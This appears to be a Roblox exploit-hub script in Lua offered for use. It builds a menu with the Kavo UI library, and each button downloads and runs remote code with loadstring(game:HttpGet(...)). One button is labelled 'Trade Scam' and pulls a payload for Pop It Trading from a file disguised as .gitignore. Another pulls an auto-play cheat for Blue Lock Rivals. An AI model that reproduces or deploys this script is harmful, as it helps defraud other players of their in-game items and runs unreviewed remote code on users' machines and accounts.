-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("🌌 Universal Aizen 🌌", "Sentinel") -- Updated theme

-- **Main Tab**
local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Scripts")

-- **Title & Close Button**
Section:NewLabel("[🔹 Universal Aizen 🔹]")
Section:NewButton("❌ Close UI", "Hides the UI", function()
    Library:ToggleUI()
end)

-- **Pop It Trading Script**
Section:NewButton("Pop It Trading", "Trade Scam", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore"))()
end)

-- **Blue Lock Rivals Script**
Section:NewButton("Blue Lock Rivals", "Auto Play Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals"))()
end)

-- **Make UI Draggable for Mobile & PC**
Library:ToggleUI()

print("✅ Universal Aizen Loaded Successfully!")
